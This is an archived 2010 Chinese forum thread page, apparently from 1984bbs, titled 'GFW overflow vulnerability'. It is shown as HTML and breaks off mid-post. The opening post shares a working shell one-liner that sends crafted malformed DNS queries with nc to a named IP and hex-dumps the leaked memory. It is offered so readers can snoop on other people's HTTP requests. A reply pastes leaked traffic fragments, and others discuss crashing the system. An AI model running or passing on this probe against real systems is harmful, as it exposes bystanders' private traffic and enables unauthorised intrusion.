<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gbk" />
<title>GFW溢出漏洞 2010-09-22 - 国家局域网研究所 -  1984bbs.com </title>
<meta name="keywords" content="" />
<meta name="MSSmartTagsPreventParsing" content="True" />
<meta http-equiv="MSThemeCompatible" content="Yes" />
<link rel="archives" title="1984bbs.com" href="https://1984bbs.com/archiver/" />
	<link rel="stylesheet" type="text/css" href="forumdata/cache/style_1_viewthread.css" />
	<link rel="stylesheet" type="text/css" href="forumdata/cache/style_1_common.css" />
<script type="text/javascript">
	var discuz_uid = 13019;var IMGDIR = 'images/default';var attackevasive = '0';var gid = 0;var STYLEID = '1';
	gid = parseInt('3');var fid = parseInt('26');var tid = parseInt('59769');
</script>
<script src="include/javascript/common.js" type="text/javascript"></script>

<style>
 .ChatAutoRefreshStyle {margin-right:0px;}
 .ChatSubmitButtonStyle {margin-right:0px;}
 .gwt-Button {margin-right:0px;}
</style>
<!-- <script src="../OnlineChat/port.for1984.OnlineChat.nocache.js" type="text/javascript"></script> -->
<script src="/onlinechat.new/onlinechat.nocache.js" type="text/javascript"></script> 

<script type="text/javascript" language="javascript">

var chat_button;
var mynickname;

var chat_start_num=0;
var chat_refresh;



function getChatViewPage(){
 return chat_start_num;
}

function sendChatRefreshButtonObjct(o)
{
chat_refresh=o;
}

function chat_reply_action(Sender)
{
 document.getElementById('chat_msg').value=
 "@"+unescape(Sender)+","+document.getElementById('chat_msg').value;
}

function receiveChatViewPage(i)
{
 chat_start_num=i;
 var nextpage=document.getElementById('chat_next_page');
 if (i==0) { 
   nextpage.style.display = "none";
   nextpage.style.visibility = "hidden";
  }
  else
  {
   nextpage.style.display = "inline";   
   nextpage.style.visibility = "visible";
  }
}

function chat_page_next()
{
chat_start_num-=getChatListLimit(100);
if (chat_start_num<0) chat_start_num=0;
chat_refresh.click();
}

function chat_page_prev()
{
chat_start_num+=getChatListLimit(100);
chat_refresh.click();
}


function setMyChatNickName(o)
{
mynickname=o;
}

function handleChatChange()
{
      try{
      q=140-document.getElementById('chat_msg').value.length;
      document.getElementById('chat_msg_length').innerHTML = ""+q;
      } catch(e) {
	}
}

var chat_check_timer;


function handleChatEnterKey(e) {
    if (e.keyCode == 13 || e.keyCode == 10) {
        if (!chat_button.disabled)
             chat_button.click();
        return false;
    }
    else 
   {
        handleChatChange();
   }
}

function getChatRefreshTime()
{
 return 6;
}

function runClearChatBox()
{
document.getElementById('chat_msg').value = "";
}

function replaceButtonText(button, text)
{
    if (button)
    {
      if (button.childNodes[0])
      {
        button.childNodes[0].nodeValue=text;
      }
      else if (button.value)
      {
        button.value=text;
      }
      else //if (button.innerHTML)
      {
        button.innerHTML=text;
      }
    }
}


function sendChatCommentButtonObjct(o)
{
 chat_button=o;
 replaceButtonText(chat_button, "提交");
 chat_check_timer= setInterval("handleChatChange()",3000);
}

function replaceURLWithHTMLLinks(text) {
var exp = /(\b(https?|ftp|file):\/\/[-A-Z0-9+&@#\/%?=~_|!:,.;]*[-A-Z0-9+&@#\/%=~_|])/ig;
return text.replace(exp,"<a href='$1' target='_blank'>$1</a>");
}

function getChatItemWriteString(Id,Sender,Msg,Time,Reply)
{
 var msg;
 try
 {
 msg=replaceURLWithHTMLLinks(Msg.substr(0,140));
 }
 catch(e) {
 msg=Msg.substr(0,140);
 }
 h="<span style='width:200px;white-space:normal; word-break:break-all;overflow:hidden;word-wrap:break-word;OVERFLOW-X:hidden;'>";
   if (Sender==mynickname) {
  h+="<font color=#ff0000>"+Sender+"</font>(<i>"+Time.substr(11)+"</i>) "+"<font color=#444444>"+msg+"</font>"+"<hr style='border-top-width:0px;border-bottom-width:1px;border-color:#eeeeee;border-right-width:0px;border-left-width:0px;' />";
   }
   else {
      h+="<font color=#000000><b>"+Sender+"</b></font>(<i>"+Time.substr(11)+"</i>) "+"<font color=#555555>"+msg+"</font>"+"<img src='1984chat_re.jpg' border=0 onclick='chat_reply_action(\""+escape(Sender)+"\");'/>"+"<hr style='border-top-width:0px;border-bottom-width:1px;border-left-width:0px;border-right-width:0px;border-color:#eeeeee;' />";
   } 
  h+="</span>";
   return h;
}

function getChatItemWriteStart()
{
 try {
　document.getElementById('online_chat_box').style.visibility = "visible";
　document.getElementById('online_chat_loading').style.visibility = "hidden";
　document.getElementById('online_chat_loading').style.display = "none";
 } catch(e) {};
  return "";
}

function getChatItemWriteEnd()
{
return "";
}

function getChatListLimit(i)
{
        return 15;
}
</script>

</head>

<body onkeydown="if(event.keyCode==27) return false;">
<div id="append_parent"></div><div id="ajaxwaitid"></div>
	<div class="wrap">
		<div id="header">
			<h2><a href="index.php" title="1984bbs.com"><img src="images/default/logo.gif" alt="1984bbs.com" border="0" /></a></h2>
			<div id="ad_headerbanner"><b>能截图的截图，喜欢备份的备份。2010年10月12日的某时某刻，1984bbs将关闭。对不起各位，我力所不能及。<br>希望1984bbs再见面的时候，这个世界上再也没有共产党。</b>——张书记 1984bbs</div>
		</div>
		<div id="menu">
			<span class="avataonline">
							<cite><a class="dropmenu" id="viewpro">vos2010</a></cite>
				<a href="logging.php?action=logout&amp;formhash=823c9fa2">退出</a>
						</span>
					<ul>
			<li><a href="my.php?item=threads">话题</a></li>
			<li><a href="my.php?item=polls&amp;type=poll">投票</a></li>
			<li><a href="my.php?item=posts">回复</a></li>
			<li><a href="my.php?item=favorites&amp;type=thread">收藏</a></li>
			<li><a href="pm.php" id="pmnotice" onclick="pmwin('open')"><font style="color:#FF0000">您有新短消息</font></a></li>
									<li><a href="search.php?srchfid=26">搜索</a></li>									
				<li><a href="memcp.php?action=profile">个人资料</a></li>				<li><a href="invite.php">邀请</a></li>																<!--				<li><a href="faq.php">关于我们</a></li> -->
			</ul>
		</div>

<style type="text/css">
.defaultpost { height: auto !important; height:120px; min-height:120px !important; }
.signatures { height: expression(signature(this)); max-height: 100px; }
</style>

<script src="include/javascript/viewthread.js" type="text/javascript"></script>
<script type="text/javascript">zoomstatus = parseInt(1);</script>

<div id="foruminfo">
	<div id="nav">
		<div class="userinfolist">
			<p><a href="index.php" id="forumlist" onmouseover="showMenu(this.id)" class="dropmenu">1984bbs.com</a> &raquo; <a href="forumdisplay.php?fid=26">国家局域网研究所</a> &raquo; GFW溢出漏洞 2010-09-22</p>
		</div>
	</div>
	<div id="headsearch">
			</div>
</div>

<div class="ad_text" id="ad_text"><table summary="Text Ad" cellpadding="0" cellspacing="1"><tr><td width="100%"><b>发布新话题与讨论建议及审查说明</b><br>
欢迎发布有讨论和阅读价值的话题；不欢迎嘲弄宗教、种族、地缘、性取向等话题。<br> 
推崇布拉格公民论坛《对话守则》：对话的目的是寻求真理，不是为了斗争；不做人身攻击；保持主题；辩论时要用证据；要分清对话与只准自己讲话的区别；尽量理解对方。<br>
遵循《世界人权宣言》第十九条不对用户已发表言论进行删除处理；用户有权限删除本人已发表言论；编辑会合并重复话题。</td></tr>
</table></div>
<div class="pages_btns">
	<div class="threadflow"><a href="redirect.php?fid=26&amp;tid=59769&amp;goto=nextoldset"> &#8249;&#8249; 上一主题</a> | <a href="redirect.php?fid=26&amp;tid=59769&amp;goto=nextnewset">下一主题 &#8250;&#8250;</a></div>
	<div class="pages"><em>&nbsp;51&nbsp;</em><strong>1</strong><a href="viewthread.php?tid=59769&amp;extra=&amp;page=2">2</a><a href="viewthread.php?tid=59769&amp;extra=&amp;page=2" class="next">&rsaquo;&rsaquo;</a></div>			<span class="postbtn" id="newspecial" onmouseover="$('newspecial').id = 'newspecialtmp';this.id = 'newspecial';showMenu(this.id)"><a href="post.php?action=newthread&amp;fid=26&amp;extra="><img src="images/default/newtopic.gif" border="0" alt="发新话题" title="发新话题" /></a></span>
		<span class="replybtn"><a href="post.php?action=reply&amp;fid=26&amp;tid=59769&amp;extra="><img src="images/default/reply.gif" border="0" alt="" /></a></span></div>

	<ul class="popupmenu_popup newspecialmenu" id="newspecial_menu" style="display: none">
		<li><a href="post.php?action=newthread&amp;fid=26&amp;extra=">发新话题</a></li>
		<li class="poll"><a href="post.php?action=newthread&amp;fid=26&amp;extra=&amp;special=1">发布投票</a></li>													</ul>

<form method="post" name="modactions">
	<input type="hidden" name="formhash" value="823c9fa2" />
	<div class="mainbox viewthread">
		<span class="headactions">
					<a href="my.php?item=favorites&amp;tid=59769" id="ajax_favorite" onclick="ajaxmenu(event, this.id, 3000, 0)">收藏</a>
			<a href="my.php?item=subscriptions&amp;subadd=59769" id="ajax_subscription" onclick="ajaxmenu(event, this.id, 3000, null, 0)">订阅</a>
			<a href="misc.php?action=emailfriend&amp;tid=59769" id="emailfriend" onclick="ajaxmenu(event, this.id, 9000000, null, 0)">推荐</a>
				<a href="viewthread.php?action=printable&amp;tid=59769" target="_blank" class="notabs">打印</a>
				</span>
		<h1>GFW溢出漏洞 2010-09-22		</h1>
							<table id="pid849338" summary="pid849338" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=6518" target="_blank" id="userinfo849338" class="dropmenu" onmouseover="showMenu(this.id)">id已被绿坝屏蔽</a></cite>
																		<p><em></em></p>
						<p></p>
						<p class="customstatus">闃呭悗鍗崇剼</p>												
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=6518">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=6518&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_0" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum849338" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=59769&page=1#pid849338', '话题链接已经复制到剪贴板')">1楼</strong>
													<em onclick="$('postmessage_849338').className='t_bigfont'">大</em>							<em onclick="$('postmessage_849338').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_849338').className='t_smallfont'">小</em>												发表于 2010-9-29 18:52&nbsp;																					<a href="viewthread.php?tid=59769&amp;page=1&amp;authorid=6518" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_0"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_0"></div><div id="ad_thread4_0"></div>
													<h2>GFW溢出漏洞 2010-09-22</h2>
						
						
																											<div id="postmessage_849338" class="t_msgfont">一条linux命令用于实时围观GFW审查机器溢出返回值。来自 <a href="http://twitter.com/gfwrev/status/25220534979" target="_blank">http://twitter.com/gfwrev/status/25220534979</a><div class="blockcode"><em onclick="copycode($('code0'));">复制内容到剪贴板</em><h5>代码:</h5><code id="code0">while true; do printf &quot;\0\0\1\0\0\1\0\0\0\0\0\0\6wux.ru\300&quot; | nc -uq1 128.241.91.35 53 | hd -s20; done</code></div>时不时能偷窥到人民群众访问三俗网站的HTTP请求。哈哈。<br />
<br />
[<i> 本帖最后由 id已被绿坝屏蔽 于 2010-9-29 19:01 编辑 </i>]</div>

							
							
							
							
															<div id="post_rate_div_849338"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo849338_menu" style="display: none;">
										<dl></dl>
										<p><a href="space.php?uid=6518" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=26&amp;tid=59769&amp;repquote=849338&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 849338)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_0"></div>				</div>
			</td>
		</tr>
		</table>
		</div><div class="ad_column" id="ad_interthread"><a href="/viewthread.php?tid=54699" target="_blank" style="color:red;">1984bbs是一个非营利项目，它需要您的捐助！</font></a>		</div>
	<div class="mainbox viewthread">
			<table id="pid849595" summary="pid849595" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=16496" target="_blank" id="userinfo849595" class="dropmenu" onmouseover="showMenu(this.id)">lehui99</a></cite>
																		<p><em></em></p>
						<p></p>
																		
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=16496">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=16496&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_1" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum849595" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=59769&page=1#pid849595', '话题链接已经复制到剪贴板')">2楼</strong>
													<em onclick="$('postmessage_849595').className='t_bigfont'">大</em>							<em onclick="$('postmessage_849595').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_849595').className='t_smallfont'">小</em>												发表于 2010-9-29 22:40&nbsp;																					<a href="viewthread.php?tid=59769&amp;page=1&amp;authorid=16496" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_1"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_1"></div><div id="ad_thread4_1"></div>
						
						
																											<div id="postmessage_849595" class="t_msgfont">看到的都是些什么呀？看到下面这些乱码：<br />
<br />
100428065610Z0!+&#65533;m}j9Χ&#65533;&#65533;a&lt;&#65533;U<br />
0911&#65533;  &nbsp;&nbsp;, &#65533;bA<br />
&nbsp;&nbsp;&#65533;&#65533;  &nbsp; &nbsp; wux.ru&#65533;$&#65533;xK90ABCDEF1234567890ABCDEF/&#65533;d=1&amp;grade=3&quot; onMouseOut=&quot;MM_swapImgRestore()&quot; onMouseOver=&quot;MM_swapImage('g3','','http://va&#65533;  &nbsp;&nbsp;, &#65533;-<br />
&nbsp;&nbsp;&#65533;&#65533;  &nbsp; &nbsp; wux.ru&#65533;$&#65533;xK90ABCDEF1234567890ABCDEF&#65533;&#65533;_&#65533;ntrol: no-cache, must-revalidate<br />
Pragma: no-cache<br />
Content-Length: 0<br />
Expires: Fri, 01 Ja&#65533;  &nbsp;&nbsp;, &#65533;&#65533;&#65533;'<br />
&nbsp;&nbsp;&#65533;&#65533;  &nbsp; &nbsp; wux.ru&#65533;$&#65533;xK90ABCDEF1234567890ABCDEF&#65533;&#65533;&#65533;Content-Type: text/html<br />
Last-Modified: Mon, 27 Sep 2010 08:21:47 GMT<br />
Accept-Ranges: byte&#65533;  &nbsp;&nbsp;, &#65533;jyK<br />
&nbsp;&nbsp;&#65533;&#65533;  &nbsp; &nbsp; wux.ru&#65533;$&#65533;xK90ABCDEF1234567890ABCDEF/&#65533;&#65533;&#65533; 2&#65533;&#65533;&#65533;^ &#65533;P0E&#65533;!E!&#65533;&amp;&#65533;&#65533;&#65533;. &#65533;&#65533;%a1P&#65533;= &#65533;&#1281;/&quot;&#65533;&#65533;&#65533;5&#65533;&#65533;[&#65533;En儺k^&#65533;&#65533;&#65533;ON&#65533;&#65533;&#65533;&#65533;&#65533;&#65533;&#65533;&#1193;~&#65533;lQM'L&#65533;&#65533;&#65533;&#65533;&#65533;&#65533;&#65533;&#65533;&#65533;&#65533;}&#65533;  &nbsp;&nbsp;, %=6&#65533;</div>

							
							
							
							
															<div id="post_rate_div_849595"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo849595_menu" style="display: none;">
										<dl></dl>
											<p><a href="https://www.google.com/reader/shared/lehui99" target="_blank">查看个人网站</a></p>
										<p><a href="space.php?uid=16496" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=26&amp;tid=59769&amp;repquote=849595&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 849595)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_1"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid849601" summary="pid849601" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=6518" target="_blank" id="userinfo849601" class="dropmenu" onmouseover="showMenu(this.id)">id已被绿坝屏蔽</a></cite>
																		<p><em></em></p>
						<p></p>
						<p class="customstatus">闃呭悗鍗崇剼</p>												
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=6518">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=6518&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_2" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum849601" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=59769&page=1#pid849601', '话题链接已经复制到剪贴板')">3楼</strong>
													<em onclick="$('postmessage_849601').className='t_bigfont'">大</em>							<em onclick="$('postmessage_849601').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_849601').className='t_smallfont'">小</em>												发表于 2010-9-29 22:44&nbsp;																					<a href="viewthread.php?tid=59769&amp;page=1&amp;authorid=6518" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_2"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_2"></div><div id="ad_thread4_2"></div>
						
						
																											<div id="postmessage_849601" class="t_msgfont"><div class="quote"><h5>引用:</h5><blockquote>原帖由 <i>lehui99</i> 于 2010-9-29 22:40 发表 <a href="https://1984bbs.com/redirect.php?goto=findpost&amp;pid=849595&amp;ptid=59769" target="_blank"><img src="https://1984bbs.com/images/common/back.gif" border="0" onclick="zoom(this, this.src)" onload="attachimg(this, 'load')" alt="" /></a><br />
看到的都是些什么呀？看到下面这些乱码：<br />
<br />
100428065610Z0!+&#65533;m}j9Χ&#65533;&#65533;a </blockquote></div>这个就是GFW流水线截获的出国边界流量。</div>

							
							
							
							
															<div id="post_rate_div_849601"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo849601_menu" style="display: none;">
										<dl></dl>
										<p><a href="space.php?uid=6518" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=26&amp;tid=59769&amp;repquote=849601&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 849601)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_2"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid849608" summary="pid849608" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=16496" target="_blank" id="userinfo849608" class="dropmenu" onmouseover="showMenu(this.id)">lehui99</a></cite>
																		<p><em></em></p>
						<p></p>
																		
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=16496">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=16496&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_3" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum849608" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=59769&page=1#pid849608', '话题链接已经复制到剪贴板')">4楼</strong>
													<em onclick="$('postmessage_849608').className='t_bigfont'">大</em>							<em onclick="$('postmessage_849608').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_849608').className='t_smallfont'">小</em>												发表于 2010-9-29 22:49&nbsp;																					<a href="viewthread.php?tid=59769&amp;page=1&amp;authorid=16496" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_3"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_3"></div><div id="ad_thread4_3"></div>
													<h2>回复 3楼 id已被绿坝屏蔽 的话题</h2>
						
						
																											<div id="postmessage_849608" class="t_msgfont">最好让GFW进程crash<br />
<br />
看到有很多访问 <a href="http://www.45setv.com/" target="_blank">http://www.45setv.com/</a> 的。</div>

							
							
							
							
															<div id="post_rate_div_849608"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo849608_menu" style="display: none;">
										<dl></dl>
											<p><a href="https://www.google.com/reader/shared/lehui99" target="_blank">查看个人网站</a></p>
										<p><a href="space.php?uid=16496" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=26&amp;tid=59769&amp;repquote=849608&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 849608)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_3"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid849650" summary="pid849650" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=4207" target="_blank" id="userinfo849650" class="dropmenu" onmouseover="showMenu(this.id)">skyking0752</a></cite>
																		<p><em></em></p>
						<p></p>
																		
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=4207">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=4207&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_4" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum849650" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=59769&page=1#pid849650', '话题链接已经复制到剪贴板')">5楼</strong>
													<em onclick="$('postmessage_849650').className='t_bigfont'">大</em>							<em onclick="$('postmessage_849650').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_849650').className='t_smallfont'">小</em>												发表于 2010-9-29 23:15&nbsp;																					<a href="viewthread.php?tid=59769&amp;page=1&amp;authorid=4207" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_4"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_4"></div><div id="ad_thread4_4"></div>
						
						
																											<div id="postmessage_849650" class="t_msgfont"><div class="quote"><h5>引用:</h5><blockquote>原帖由 <i>lehui99</i> 于 2010-9-29 22:49 发表 <a href="https://1984bbs.com/redirect.php?goto=findpost&amp;pid=849608&amp;ptid=59769" target="_blank"><img src="https://1984bbs.com/images/common/back.gif" border="0" onclick="zoom(this, this.src)" onload="attachimg(this, 'load')" alt="" /></a><br />
最好让GFW进程crash<br />
<br />
看到有很多访问 <a href="http://www.45setv.com/" target="_blank">http://www.45setv.com/</a> 的。 </blockquote></div>师父搞TV，不用注册也可以看无码，利害啊</div>

							
							
							
							
															<div id="post_rate_div_849650"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo849650_menu" style="display: none;">
										<dl></dl>
										<p><a href="space.php?uid=4207" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=26&amp;tid=59769&amp;repquote=849650&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 849650)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_4"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid849665" summary="pid849665" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=6518" target="_blank" id="userinfo849665" class="dropmenu" onmouseover="showMenu(this.id)">id已被绿坝屏蔽</a></cite>
																		<p><em></em></p>
						<p></p>
						<p class="customstatus">闃呭悗鍗崇剼</p>												
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=6518">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=6518&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_5" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum849665" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=59769&page=1#pid849665', '话题链接已经复制到剪贴板')">6楼</strong>
													<em onclick="$('postmessage_849665').className='t_bigfont'">大</em>							<em onclick="$('postmessage_849665').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_849665').className='t_smallfont'">小</em>												发表于 2010-9-29 23:27&nbsp;																					<a href="viewthread.php?tid=59769&amp;page=1&amp;authorid=6518" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_5"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_5"></div><div id="ad_thread4_5"></div>
						
						
																											<div id="postmessage_849665" class="t_msgfont"><div class="quote"><h5>引用:</h5><blockquote>原帖由 <i>lehui99</i> 于 2010-9-29 22:49 发表 <a href="https://1984bbs.com/redirect.php?goto=findpost&amp;pid=849608&amp;ptid=59769" target="_blank"><img src="https://1984bbs.com/images/common/back.gif" border="0" onclick="zoom(this, this.src)" onload="attachimg(this, 'load')" alt="" /></a><br />
最好让GFW进程crash<br />
<br />
看到有很多访问 <a href="http://www.45setv.com/" target="_blank">http://www.45setv.com/</a> 的。 </blockquote></div>gfw也不会sb到没有监护daemon的地步。肯定有冗余进程保证进程崩溃自动respawn的。</div>

							
							
							
							
															<div id="post_rate_div_849665"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo849665_menu" style="display: none;">
										<dl></dl>
										<p><a href="space.php?uid=6518" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=26&amp;tid=59769&amp;repquote=849665&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 849665)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_5"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid849820" summary="pid849820" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=7766" target="_blank" id="userinfo849820" class="dropmenu" onmouseover="showMenu(this.id)">麦圆</a></cite>
																		<p><em></em></p>
						<p></p>
						<p class="customstatus">Twitter @math2gold | 惊诧的火星友邦 |  咪咪是 /math2ogld　</p>												
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=7766">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=7766&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_6" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum849820" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=59769&page=1#pid849820', '话题链接已经复制到剪贴板')">7楼</strong>
													<em onclick="$('postmessage_849820').className='t_bigfont'">大</em>							<em onclick="$('postmessage_849820').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_849820').className='t_smallfont'">小</em>												发表于 2010-9-30 02:33&nbsp;																					<a href="viewthread.php?tid=59769&amp;page=1&amp;authorid=7766" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_6"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_6"></div><div id="ad_thread4_6"></div>
						
						
																											<div id="postmessage_849820" class="t_msgfont">这个不错，正在尝试。</div>

							
							
							
							
															<div id="post_rate_div_849820"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo849820_menu" style="display: none;">
										<dl></dl>
											<p><a href="http://math2gold.com/" target="_blank">查看个人网站</a></p>
										<p><a href="space.php?uid=7766" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=26&amp;tid=59769&amp;repquote=849820&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 849820)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_6"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid849822" summary="pid849822" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=7766" target="_blank" id="userinfo849822" class="dropmenu" onmouseover="showMenu(this.id)">麦圆</a></cite>
																		<p><em></em></p>
						<p></p>
						<p class="customstatus">Twitter @math2gold | 惊诧的火星友邦 |  咪咪是 /math2ogld　</p>												
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=7766">发短消息</a></li> -->
